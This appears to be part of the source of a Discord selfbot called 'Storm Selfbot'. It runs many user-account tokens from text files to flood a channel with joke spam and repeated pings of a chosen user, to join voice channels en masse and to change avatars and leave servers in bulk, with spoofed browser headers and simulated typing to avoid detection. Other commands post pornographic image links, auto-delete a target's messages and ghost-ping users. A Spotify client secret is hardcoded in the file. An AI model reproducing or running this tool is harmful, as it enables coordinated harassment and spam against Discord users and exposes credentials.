@bot.command(name="autonick")
async def autonick(ctx, action: str, member: discord.Member = None, *, nickname: str = None):
    global forced_nicknames

    if action == "toggle":
        if member is None or nickname is None:
            await ctx.send("```Please mention a user and provide a nickname.```")
            return

        if ctx.guild.me.guild_permissions.manage_nicknames:
            forced_nicknames[member.id] = nickname
            await member.edit(nick=nickname)
            await ctx.send(f"```{member.display_name}'s nickname has been set to '{nickname}'.```")
        else:
            await ctx.send("```I do not have permission to change nicknames.```")

    elif action == "list":
        if forced_nicknames:
            user_list = "\n".join([f"<@{user_id}>: '{name}'" for user_id, name in forced_nicknames.items()])
            await ctx.send(f"```Users with forced nicknames:\n{user_list}```")
        else:
            await ctx.send("No users have forced nicknames.")

    elif action == "clear":
        if member is None:
            forced_nicknames.clear()
            await ctx.send("```All forced nicknames have been cleared.```")
        else:
            if member.id in forced_nicknames:
                del forced_nicknames[member.id]
                await member.edit(nick=None)  
                await ctx.send(f"```{member.display_name}'s forced nickname has been removed.```")
            else:
                await ctx.send(f"```{member.display_name} does not have a forced nickname.```")
    else:
        await ctx.send("```Invalid action. Use `toggle`, `list`, or `clear`.```")
@bot.event
async def on_member_update(before, after):
    if before.nick != after.nick and after.id in forced_nicknames:
        forced_nickname = forced_nicknames[after.id]
        if after.nick != forced_nickname:  
            try:
                await after.edit(nick=forced_nickname)
                print(f"Nickname for {after.display_name} reset to forced nickname '{forced_nickname}'.")
            except discord.errors.Forbidden:
                print("Bot does not have permission to change nicknames.")

from collections import defaultdict

force_delete_users = defaultdict(bool)  


@bot.command(name="forcepurge")
async def forcepurge(ctx, action: str, member: discord.Member = None):
    if action.lower() == "toggle":
        if member is None:
            await ctx.send("```Please mention a user to toggle force delete.```")
            return
        force_delete_users[member.id] = not force_delete_users[member.id]
        status = "enabled" if force_delete_users[member.id] else "disabled"
        await ctx.send(f"```Auto-delete messages for {member.display_name} has been {status}.```")

    elif action.lower() == "list":

        enabled_users = [f"```<@{user_id}>```" for user_id, enabled in force_delete_users.items() if enabled]
        if enabled_users:
            await ctx.send("```Users with auto-delete enabled:\n```" + "\n".join(enabled_users))
        else:
            await ctx.send("```No users have auto-delete enabled.```")

    elif action.lower() == "clear":
        force_delete_users.clear()
        await ctx.send("```Cleared auto-delete settings for all users.```")

    else:
        await ctx.send("```Invalid action. Use `toggle`, `list`, or `clear`.```")

RECONNECT_DELAY = 0.1  # Delay before attempting to reconnect
RECONNECT_TIME = 120  # Time after which we will disconnect (2 minutes)



# Dictionary to store token-channel mappings for DMs/GCs and Servers
active_connections = {}  # Stores token-channel mappings and connection states

# WebSocket connection function for DMs and Group DMs
async def connect_to_dm_or_gc(token, channel_id):
    """Connect to a DM or Group DM using websockets."""
    uri = 'wss://gateway.discord.gg/?v=9&encoding=json'
    # Create a unique websocket connection per token
    async with websockets.connect(uri, max_size=None) as VOICE_WEBSOCKET:
        try:
            # Identify payload
            identify_payload = {
                'op': 2,
                'd': {
                    'token': token,
                    'intents': 513,
                    'properties': {
                        '$os': 'linux',
                        '$browser': 'my_library',
                        '$device': 'my_library'
                    }
                }
            }
            await VOICE_WEBSOCKET.send(json.dumps(identify_payload))

            # Voice State payload to join the voice channel
            voice_state_payload = {
                'op': 4,
                'd': {
                    'guild_id': None,  # For DMs and group chats
                    'channel_id': str(channel_id),
                    'self_mute': False,
                    'self_deaf': False,
                    'self_video': False
                }
            }
            await VOICE_WEBSOCKET.send(json.dumps(voice_state_payload))

            print(f"Connected to DM/GC channel {channel_id} with token ending in {token[-4:]}.")
            
            # Store this connection mapping and state
            active_connections[token] = {
                'channel_id': channel_id,
                'VOICE_WEBSOCKET': VOICE_WEBSOCKET
            }

            # Monitor connection and reconnect after disconnect
            await monitor_and_reconnect_dm_or_gc(token)

        except Exception as e:
            print(f"An error occurred while connecting to DM/GC channel {channel_id}: {e}")

async def monitor_and_reconnect_dm_or_gc(token):
    """Monitors the connection for each token and reconnects after disconnect."""
    while True:
        try:
            if token in active_connections:
                VOICE_WEBSOCKET = active_connections[token]['VOICE_WEBSOCKET']
                if VOICE_WEBSOCKET and VOICE_WEBSOCKET.closed:
                    print(f"Token ending in {token[-4:]} disconnected. Reconnecting...")
                    
                    # Get the original channel for reconnection
                    channel_id = active_connections[token]['channel_id']
                    await connect_to_dm_or_gc(token, channel_id)  # Reconnect to the same channel with the same token
                    
            await asyncio.sleep(RECONNECT_TIME)  # Check every 2 minutes

        except Exception as e:
            print(f"Reconnect attempt failed for token ending in {token[-4:]}: {e}")
            await asyncio.sleep(RECONNECT_DELAY)

# Standard connection for Server voice channels
async def connect_to_voice(token, channel_id, guild_id):
    """Connect a bot to a specific server voice channel."""
    intents = discord.Intents.default()
    intents.voice_states = True
    bot_instance = commands.Bot(command_prefix="!", intents=intents)

    @bot_instance.event
    async def on_ready():
        print(f"Logged in as {bot_instance.user} using token ending in {token[-4:]}.")
        guild = bot_instance.get_guild(guild_id)
        if not guild:
            print(f"Guild not found for ID {guild_id}.")
            return
        
        channel = discord.utils.get(guild.voice_channels, id=channel_id)
        if not channel:
            print(f"Voice channel not found for ID {channel_id}.")
            return
        
        try:
            await channel.connect()  # Connect to the voice channel
            print(f"Successfully connected to {channel.name} with token ending in {token[-4:]}.")
            
            # Store this connection mapping
            active_connections[token] = {
                'channel_id': channel_id,
                'guild_id': guild_id
            }

        except Exception as e:
            print(f"Failed to connect with token ending in {token[-4:]}: {e}")

    await bot_instance.start(token, bot=False)  # Start the bot with the token

async def connect_all_tokens_to_voice(channel_id, guild_id):
    """Connect all tokens to a specified voice channel in a server."""
    with open("tokens3.txt", "r") as f:  # Now reads from tokens3.txt
        tokens = f.read().splitlines()
    
    tasks = []
    for token in tokens:
        tasks.append(connect_to_voice(token, channel_id, guild_id))
    
    await asyncio.gather(*tasks)

@bot.command()
async def vc(ctx, position: int, channel_id: int):
    """Command to connect to a specific voice channel at a specified position."""
    guild_id = ctx.guild.id if ctx.guild else None
    with open("tokens3.txt", "r") as f:  # Reads from tokens3.txt
        tokens = f.read().splitlines()
    
    if 1 <= position <= len(tokens):
        token = tokens[position - 1]  # Adjust for 1-based index
        
        if ctx.guild:  # Server VC
            # For server voice channels
            await connect_to_voice(token, channel_id, guild_id)
            await ctx.send(f"Connected token at position {position} to server channel {channel_id}.")
        else:  # For DM or Group DM
            await connect_to_dm_or_gc(token, channel_id)  # DM/GC connection
            await ctx.send(f"Connected token at position {position} to DM/GC channel {channel_id}.")
    else:
        await ctx.send(f"Invalid position: {position}. Position must be between 1 and {len(tokens)}.")

@bot.command()
async def vce(ctx, position: int):
    """Command to connect to the calling voice channel at a specified position."""
    if ctx.author.voice and ctx.author.voice.channel:
        channel_id = ctx.author.voice.channel.id
        await vc(ctx, position, channel_id)
    else:
        await ctx.send("You are not connected to any voice channel.")

@bot.command()
async def vca(ctx, channel_id: int):
    """Command to connect all tokens to a specified voice channel."""
    guild_id = ctx.guild.id
    await connect_all_tokens_to_voice(channel_id, guild_id)
    await ctx.send(f"Connected all tokens to channel {channel_id}.")

# Run the bot'

@bot.command()
async def boobs(ctx):
    await ctx.message.delete()

    response = requests.get("https://nekobot.xyz/api/image?type=boobs")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)
    
    


        

@bot.command()
async def hboobs(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=hboobs")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)


@bot.command()
async def anal(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=anal")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)




@bot.command()
async def hanal(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=hanal")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)




@bot.command(name="4k")
async def caughtin4k(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=4k")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)

    


@bot.command()
async def gif(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=pgif")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)
    
import spotipy   
from spotipy.oauth2 import SpotifyOAuth
from spotipy.oauth2 import SpotifyOAuth

SPOTIFY_CLIENT_ID = '4a48f6f0c2594b2ba04560dc9a81c1bd'
SPOTIFY_CLIENT_SECRET = 'e81001326b8e47c19f974d2e60a2998f'
SPOTIFY_REDIRECT_URI = 'http://localhost:8888/callback'  
SCOPE = "user-read-playback-state user-modify-playback-state"

spotify_client = spotipy.Spotify(auth_manager=SpotifyOAuth(
    client_id=SPOTIFY_CLIENT_ID,
    client_secret=SPOTIFY_CLIENT_SECRET,
    redirect_uri=SPOTIFY_REDIRECT_URI,
    scope=SCOPE
))
@bot.command()
async def spotify(ctx, action=None, *args):
    if not action:
        await ctx.send("Usage: `.spotify <unpause/pause/next/prev/volume/current/play/shuffle/addqueue/repeat>`")
        return

    try:
        if action.lower() == "unpause":
            spotify_client.start_playback()
            await ctx.send("``` Resumed playback.```")

        elif action.lower() == "pause":
            spotify_client.pause_playback()
            await ctx.send("```Paused playback.```")

        elif action.lower() == "next":
            spotify_client.next_track()
            await ctx.send("```Skipped to next track.```")

        elif action.lower() == "prev":
            spotify_client.previous_track()
            await ctx.send("```Reverted to previous track.```")

        elif action.lower() == "volume":
            try:
                volume = int(args[0])
                if 0 <= volume <= 100:
                    spotify_client.volume(volume)
                    await ctx.send(f"```Volume set to {volume}%.```")
                else:
                    await ctx.send("```Volume must be between 0 and 100.```")
            except (ValueError, IndexError):
                await ctx.send("```Usage: .spotify volume <0-100>```")

        elif action.lower() == "current":
            current_track = spotify_client.current_playback()
            if current_track and current_track['item']:
                track_name = current_track['item']['name']
                artists = ", ".join([artist['name'] for artist in current_track['item']['artists']])
                await ctx.send(f"``` Now Playing: \n{track_name} by {artists}```")
            else:
                await ctx.send("```No track currently playing.```")

        elif action.lower() == "play":
            query = " ".join(args)
            if query:
                results = spotify_client.search(q=query, type="track", limit=1)
                tracks = results.get('tracks', {}).get('items')
                if tracks:
                    track_uri = tracks[0]['uri']
                    spotify_client.start_playback(uris=[track_uri])
                    await ctx.send(f"```Now Playing: {tracks[0]['name']} by {', '.join([artist['name'] for artist in tracks[0]['artists']])}```")
                else:
                    await ctx.send("```No results found for that song.```")
            else:
                await ctx.send("```Usage: .spotify play <song name> to play a specific song.```")

        elif action.lower() == "shuffle":
            if args and args[0].lower() in ['on', 'off']:
                state = args[0].lower()
                if state == "on":
                    spotify_client.shuffle(True)
                    await ctx.send("```Shuffle mode turned on.```")
                else:
                    spotify_client.shuffle(False)
                    await ctx.send("```Shuffle mode turned off.```")
            else:
                await ctx.send("```Usage: .spotify shuffle <on/off> to toggle shuffle mode.```")

        elif action.lower() == "addqueue":
            query = " ".join(args)
            if query:
                results = spotify_client.search(q=query, type="track", limit=1)
                tracks = results.get('tracks', {}).get('items')
                if tracks:
                    track_uri = tracks[0]['uri']
                    spotify_client.add_to_queue(track_uri)
                    await ctx.send(f"```Added {tracks[0]['name']} by {', '.join([artist['name'] for artist in tracks[0]['artists']])} to the queue.```")
                else:
                    await ctx.send("```No results found for that song.```")
            else:
                await ctx.send("```Usage: .spotify addqueue <song name> to add a song to the queue.```")

        elif action.lower() == "repeat":
            if args and args[0].lower() in ['track', 'context', 'off']:
                state = args[0].lower()
                if state == "track":
                    spotify_client.repeat("track")
                    await ctx.send("```Repeat mode set to track.```")
                elif state == "context":
                    spotify_client.repeat("context")
                    await ctx.send("```Repeat mode set to context.```")
                else:
                    spotify_client.repeat("off")
                    await ctx.send("```Repeat mode turned off.```")
            else:
                await ctx.send("```Usage: .spotify repeat <track/context/off> to set the repeat mode.```")

        else:
            await ctx.send("```Invalid action. Use .spotify <unpause/pause/next/prev/volume/current/play/shuffle/addqueue/repeat>```")

    except spotipy.SpotifyException as e:
        await ctx.send(f"```Error controlling Spotify: {e}```")
        
@bot.command()
async def createchannel(ctx, name: str = "Storm Selfbot"):
    if ctx.author.guild_permissions.manage_channels:
        await ctx.guild.create_text_channel(name)
        await ctx.send(f"```channel '{name}' created.```")
    else:
        await ctx.send("```You don't have permission to create text channels.```")

@bot.command()
async def createvc(ctx, name: str = "Storm Selfbot VC"):
    if ctx.author.guild_permissions.manage_channels:
        await ctx.guild.create_voice_channel(name)
        await ctx.send(f"```voice channel '{name}' created.```")
    else:
        await ctx.send("```You don't have permission to create voice channels.```")

@bot.command()
async def createrole(ctx, *, name: str = "Storm Selfbot role"):
    guild = ctx.guild
    try:
        role = await guild.create_role(name=name)
        await ctx.send(f"```Role '{role.name}' has been created successfully.```")
    except discord.Forbidden:
        await ctx.send("```You don't have the required permissions to create a role.```")
    except discord.HTTPException as e:
        await ctx.send(f"```An error occurred: {e}```")
        
        
@bot.command()
async def ghostping(ctx, user: discord.User):

    try:

        message = await ctx.send(f"{user.mention}")
        await message.delete()  
        await ctx.message.delete()  

    except Exception as e:
        await ctx.send(f"```Failed: {e}```")

typing_active = {}  

@bot.command()
async def triggertyping(ctx, time: str, channel: discord.TextChannel = None):

    
    if channel is None:
        channel = ctx.channel

    total_seconds = 0


    try:
        if time.endswith('s'):
            total_seconds = int(time[:-1]) 
        elif time.endswith('m'):
            total_seconds = int(time[:-1]) * 60  
        elif time.endswith('h'):
            total_seconds = int(time[:-1]) * 3600  
        else:
            total_seconds = int(time)  
    except ValueError:
        await ctx.send("Please provide a valid time format (e.g., 5s, 2m, 1h).")
        return

   
    typing_active[channel.id] = True

    try:
        async with channel.typing():
            await ctx.send(f"```Triggered typing for {total_seconds}```")
            await asyncio.sleep(total_seconds)  
    except Exception as e:
        await ctx.send("```Failed to trigger typing```")
    finally:
        typing_active.pop(channel.id, None)

@bot.command()
async def triggertypingoff(ctx, channel: discord.TextChannel = None):

    
    if channel is None:
        channel = ctx.channel

    if channel.id in typing_active:
        typing_active.pop(channel.id)  
        await ctx.send(f"```Stopped typing in {channel.name}.```")
    else:
        await ctx.send(f"```No typing session is active```")

@bot.command()
async def nickname(ctx, *, new_nickname: str):
    
    if ctx.guild:
        try:
            
            await ctx.guild.me.edit(nick=new_nickname)
            await ctx.send(f'```Nickname changed to: {new_nickname}```')
        except discord.Forbidden:
            await ctx.send('```Cannot change nickname```')
    else:
        await ctx.send('```This command can only be used in a server.```')

@bot.command()
async def purge(ctx, num: int = None):
    """Purges a specified number of messages, including old ones, in DMs and Group Chats."""

    # Check if the command is used in DMs or a Group Chat
    if isinstance(ctx.channel, discord.DMChannel) or isinstance(ctx.channel, discord.GroupChannel):

        if num is not None and num < 1:
            await ctx.send("Please specify a number greater than 0.")
            return

        deleted_count = 0  # Track how many messages have been deleted

        # If num is None, delete as many messages as possible with a 0.5-second delay
        if num is None:
            # Fetch all messages in the channel (limit to 1000 to avoid overload)
            async for message in ctx.channel.history(limit=1000):
                try:
                    # Check if the message is sent by the user (bot/self-bot), skip if not
                    if message.author == Safari.user or message.author == ctx.author:
                        await message.delete()
                        deleted_count += 1
                        await asyncio.sleep(0.01)  # 0.5 seconds delay between each delete
                except discord.Forbidden:
                    await ctx.send("I don't have permission to delete messages here.")
                    return
                except discord.HTTPException:
                    # Stop if we hit rate limits or any other errors
                    await ctx.send(f"Stopped after deleting {deleted_count} messages due to an error.")
                    return

        else:
            # Fetch the specified number of messages
            async for message in ctx.channel.history(limit=num):
                try:
                    # Only delete messages from the bot/user, skip others
                    if message.author == bot.user or message.author == ctx.author:
                        await message.delete()
                        deleted_count += 1
                        await asyncio.sleep(0.05)  # 0.5 seconds delay between each delete
                except discord.Forbidden:
                    await ctx.send("I don't have permission to delete messages here.")
                    return
                except discord.HTTPException:
                    # Stop if we hit rate limits or any other errors
                    await ctx.send(f"Stopped after deleting {deleted_count} messages due to an error.")
                    return

        # Inform the user about the successful deletion
        await ctx.send(f"Successfully deleted {deleted_count} message(s).")

    else:
        await ctx.send("This command can only be used in DMs or Group Chats.")

def loads_tokens(file_path='tokens2.txt'):
    with open(file_path, 'r') as file:
        tokens = file.readlines()
    return [token.strip() for token in tokens if token.strip()]
       
@bot.command()
async def tpfp(ctx, url: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```
Token PFP Changer
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        if url is None:
            await status_msg.edit(content="```Please provide an image URL```")
            return

        success = 0
        failed = 0
        ratelimited = 0
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as img_response:
                if img_response.status != 200:
                    await status_msg.edit(content="```Failed to fetch image```")
                    return
                image_data = await img_response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = img_response.headers.get('Content-Type', '')
                if 'gif' in content_type.lower():
                    image_format = 'gif'
                else:
                    image_format = 'png'

            for i, token in enumerate(selected_tokens, 1):
                headers = {
                    "authority": "discord.com",
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": bot.http.token,
                    "content-type": "application/json",
                    "origin": "https://discord.com",
                    "referer": "https://discord.com/channels/@me",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
                    "x-debug-options": "bugReporterEnabled",
                    "x-discord-locale": "en-US",
                    "x-super-properties": "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IlNhZmFyaSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IFNhZmFyaS82MDUuMS4xNSIsImJyb3dzZXJfdmVyc2lvbiI6IjE2LjUiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                
                payload = {
                    "avatar": f"data:image/{image_format};base64,{image_b64}"
                }
                
                try:
                    async with session.get(
                        'https://discord.com/api/v9/users/@me',
                        headers=headers
                    ) as verify_resp:
                        if verify_resp.status != 200:
                            failed += 1
                            print(f"Invalid token {i}")
                            continue

                    async with session.patch(
                        'https://discord.com/api/v9/users/@me',
                        headers=headers,
                        json=payload
                    ) as resp:
                        response_data = await resp.json()
                        
                        if resp.status == 200:
                            success += 1
                        elif "captcha_key" in response_data:
                            failed += 1
                            print(f"Captcha required for token {i}")
                        elif "AVATAR_RATE_LIMIT" in str(response_data):
                            ratelimited += 1
                            print(f"Rate limited for token {i}, waiting 30 seconds")
                            await asyncio.sleep(30)  
                            i -= 1  
                            continue
                        else:
                            failed += 1
                            print(f"Failed to update token {i}: {response_data}")
                        
                        progress = f"""```xml
Changing Profile Pictures...
Progress: < {i}/{len(selected_tokens)} > ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Failed: {failed}
Rate Limited: {ratelimited}```"""
                        await status_msg.edit(content=progress)
                        await asyncio.sleep(2)  
                        
                except Exception as e:
                    failed += 1
                    print(f"Error with token {i}: {str(e)}")
                    continue

        await status_msg.edit(content=f"""```xml
Profile Picture Change Completed
Successfully changed: < {success}/{len(selected_tokens)} > avatars
Failed: {failed}
Rate Limited: {ratelimited}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
async def tleave(ctx, server_id: str = None):
    if not server_id:
        await ctx.send("```Please provide a server ID```")
        return
        
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
\u001b[0;36mToken Server Leave\u001b[0m
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        success = 0
        failed = 0
        ratelimited = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):
                headers = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'en-US,en;q=0.7',
                    'authorization': token,
                    'content-type': 'application/json',
                    'origin': 'https://discord.com',
                    'referer': 'https://discord.com/channels/@me',
                    'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                    'x-debug-options': 'bugReporterEnabled',
                    'x-discord-locale': 'en-US',
                    'x-discord-timezone': 'America/New_York',
                    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3NlYXJjaC5icmF2ZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6InNlYXJjaC5icmF2ZS5jb20iLCJyZWZlcnJlcl9jdXJyZW50IjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiJkaXNjb3JkLmNvbSIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM0NzY5OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
                }
                
                try:

                    async with session.delete(
                        f'https://discord.com/api/v9/users/@me/guilds/{server_id}',
                        headers=headers,
                        json={"lurking": False}  
                    ) as resp:
                        response_data = await resp.text()
                        
                        if resp.status in [204, 200]:  
                            success += 1
                        elif resp.status == 429:  
                            ratelimited += 1
                            retry_after = float((await resp.json()).get('retry_after', 5))
                            print(f"Rate limited for token {i}, waiting {retry_after} seconds")
                            await asyncio.sleep(retry_after)
                            i -= 1  
                            continue
                        else:
                            failed += 1
                            print(f"Failed to leave server with token {i}: {response_data}")
                        
                        progress = f"""```ansi
\u001b[0;36mLeaving Server...\u001b[0m
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Failed: {failed}
Rate Limited: {ratelimited}```"""
                        await status_msg.edit(content=progress)
                        await asyncio.sleep(1)   
                        
                except Exception as e:
                    failed += 1
                    print(f"Error with token {i}: {str(e)}")
                    continue

        await status_msg.edit(content=f"""```ansi
\u001b[0;32mServer Leave Complete\u001b[0m
Successfully left: {success}/{len(selected_tokens)}
Failed: {failed}
Rate Limited: {ratelimited}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")
        
        
send_messages = {}
current_modes = {}  # Store current modes for each token
message_count = {}  # Count of messages sent per token
jokes1 = []  # Load jokes from mjokes.txt
image_links = {}  # Dictionary to store image links for each token
user_react_dict = {}  # Dictionary to store user IDs to ping for each token

# Load jokes from mjokes.txt
def load_jokes():
    with open('mjokes.txt', 'r') as file:
        jokes = file.readlines()
    return [joke.strip() for joke in jokes]

jokes1 = load_jokes()

def read_tokens(filename='tokens2.txt'):
    """Read tokens from a file and return them as a list."""
    with open(filename, 'r') as file:
        tokens = file.read().splitlines()
    return tokens

def get_token_by_position(position):
    """Retrieve a token by its position from the tokens list, adjusted for 1-based indexing."""
    tokens = read_tokens()
    # Adjust for 1-based position by subtracting 1 from the input
    if 1 <= position <= len(tokens):
        return tokens[position - 1]
    return None

class MessageBot(discord.Client):
    def __init__(self, token, channel_id, position, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.channel_id = channel_id
        self.position = position

    async def on_ready(self):
        print(f'Logged in as {self.user} using token {self.token[-4:]}.')
        await self.send_messages()

    async def send_messages(self):
        global message_count
        channel = self.get_channel(self.channel_id) or await self.fetch_channel(self.channel_id)

        while send_messages.get(self.position, False):
            message_count[self.position] = message_count.get(self.position, 0) + 1

            # Check if message count exceeds 7
            if message_count[self.position] > 7:
                current_modes[self.position] = 2  # Switch to mode 2 for 10 seconds
                await asyncio.sleep(10)  # Wait for 10 seconds
                current_modes[self.position] = 7  # Revert back to mode 7
                message_count[self.position] = 0  # Reset message count

            # Select a random joke
            joke = random.choice(jokes1)
            words = joke.split()
            ping_user = user_react_dict.get(self.position, None)  # Get the user ID to ping

            await self.simulate_typing(channel)

            mode = current_modes.get(self.position, 1)  # Default to mode 1 if not set

            if mode == 1:  # Mode 1: Randomly sends 1 or 2 words at a time
                i = 0
                while i < len(words):
                    if i < len(words) - 1 and random.random() < 0.5:
                        # Send two words
                        msg = words[i] + " " + words[i + 1]
                        i += 2
                    else:
                        # Send one word
                        msg = words[i]
                        i += 1

                    await channel.send(msg)
                    await self.maybe_ping_user(channel, ping_user)
                    await asyncio.sleep(random.uniform(0.9, 1.4))  # Adjusted delay

            elif mode == 2:  # Mode 2: Sends the whole joke as a sentence
                await channel.send(joke)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5))

            elif mode == 3:  # Mode 3: Sends each word on a new line
                new_line_msg = '\n'.join(words)
                await channel.send(new_line_msg)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5) + 0.1)

            elif mode == 4:  # Mode 4: Header format
                header_msg = f"# {joke}"
                await channel.send(header_msg)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5) + 0.5)

            elif mode == 5:  # Mode 5: > # format
                header_msg = f"> # {joke}"
                await channel.send(header_msg)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5) + 0.5)

            elif mode == 6:  # Mode 6: More configurations as needed
                await channel.send(joke)
                await self.maybe_ping_user(channel, ping_user)
                await asyncio.sleep(random.uniform(2.5, 3.5))

            elif mode == 7:  # Mode 7: Combination of modes 1, 2, and 3
                format_choice = random.randint(1, 3)
                if format_choice == 1:  # Mode 1
                    i = 0
                    while i < len(words):
                        if i < len(words) - 1 and random.random() < 0.5:
                            msg = words[i] + " " + words[i + 1]
                            i += 2
                        else:
                            msg = words[i]
                            i += 1

                        await channel.send(msg)

                elif format_choice == 2:  # Mode 2
                    await channel.send(joke)

                elif format_choice == 3:  # Mode 3
                    new_line_msg = '\n'.join(words)
                    await channel.send(new_line_msg)

    async def maybe_ping_user(self, channel, user_id):
        """Ping the user with 100% chance."""
        if user_id:
            await channel.send(f"<@{user_id}>")

    async def simulate_typing(self, channel):
        """Simulate typing before sending a message."""
        async with channel.typing():
            await asyncio.sleep(random.uniform(1, 3))  # Simulate typing for a random time    
    




@bot.command()
async def ma(ctx, channel_id: int):
    """Start sending messages using all tokens in the specified channel simultaneously."""
    global send_messages
    tokens = read_tokens()
    tasks = []

    for position, token in enumerate(tokens):
        send_messages[position] = True  # Ensure message sending is allowed for the specified token
        message_count[position] = 0  # Reset message count for this token
        current_modes[position] = 1  # Default to mode 1 for this token

        client = MessageBot(token, channel_id, position)
        tasks.append(client.start(token, bot=False))  # Create a task for each token

    await asyncio.gather(*tasks)  # Start all tasks simultaneously

@bot.command()
async def mae(ctx):
    """Stop sending messages for all tokens."""
    global send_messages
    for position in send_messages.keys():
        send_messages[position] = False  # Disable sending messages for each token
    await ctx.send("Stopped all tokens from sending messages.")
@bot.command()
async def mp(ctx, position: int, user_id: int):
    """Set the user ID to ping at the end of the messages for the specified token."""
